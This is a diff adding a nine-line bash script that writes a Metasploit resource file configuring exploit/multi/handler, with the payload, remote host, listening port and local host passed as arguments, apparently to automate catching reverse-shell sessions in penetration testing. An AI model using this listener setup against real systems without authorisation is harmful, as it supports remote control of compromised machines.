@@ -1,0 +1,9 @@
+#!/usr/bin/bash
+echo """
+use exploit/multi/handler
+set PAYLOAD $1
+set RHOST $2
+set LPORT $3
+set LHOST $4
+run
+""" >> msf.rc
